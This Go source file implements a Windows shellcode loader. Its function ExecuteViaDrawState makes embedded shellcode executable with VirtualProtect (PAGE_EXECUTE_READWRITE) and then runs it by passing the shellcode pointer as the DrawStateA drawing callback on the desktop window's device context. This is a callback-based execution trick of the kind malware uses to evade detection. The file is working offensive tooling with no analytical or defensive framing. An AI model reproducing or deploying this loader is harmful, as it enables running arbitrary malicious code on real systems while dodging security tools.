package sh

import (
	"fmt"
	"time"
	"unsafe"
	api "github.com/carved4/go-wincall"
)

const (
	DST_COMPLEX = 0x0000
	DSS_NORMAL  = 0x0000
)

var (
	windowDC uintptr
)

// ExecuteViaDrawState executes shellcode via DrawStateA complex drawing callback
func ExecuteViaDrawState() error {
	shellcode := GetEmbeddedShellcode()
	
	var oldProtect uint32
	shellcodePtr := uintptr(unsafe.Pointer(&shellcode[0]))
	
	// Make shellcode executable
	success, err := api.Call("kernel32.dll", "VirtualProtect",
		shellcodePtr,                         // lpAddress
		uintptr(len(shellcode)),             // dwSize
		0x40,                                // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)), // lpflOldProtect
	)
	if err != nil || success == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	
	// Get desktop window DC for drawing
	desktopWindow, err := api.Call("user32.dll", "GetDesktopWindow")
	if err != nil || desktopWindow == 0 {
		return fmt.Errorf("GetDesktopWindow failed: %v", err)
	}
	
	windowDC, err = api.Call("user32.dll", "GetDC", desktopWindow)
	if err != nil || windowDC == 0 {
		return fmt.Errorf("GetDC failed: %v", err)
	}
	defer api.Call("user32.dll", "ReleaseDC", desktopWindow, windowDC)
	
	// Call DrawStateA with DST_COMPLEX flag - this invokes our callback for custom drawing
	success, err = api.Call("user32.dll", "DrawStateA",
		windowDC,         // hdc
		uintptr(0),       // hbr (brush, null for default)
		shellcodePtr,     // lpOutputFunc (our shellcode callback!)
		uintptr(0),       // lData (arbitrary data passed to callback)
		uintptr(0),       // wData (length of data)
		uintptr(0),       // x
		uintptr(0),       // y
		uintptr(100),     // cx (width)
		uintptr(100),     // cy (height)
		uintptr(DST_COMPLEX | DSS_NORMAL), // fuFlags (DST_COMPLEX uses callback)
	)
	if err != nil {
		return fmt.Errorf("DrawStateA failed: %v", err)
	}
	
	// Wait for callback execution
	time.Sleep(100 * time.Millisecond)
	
	return nil
}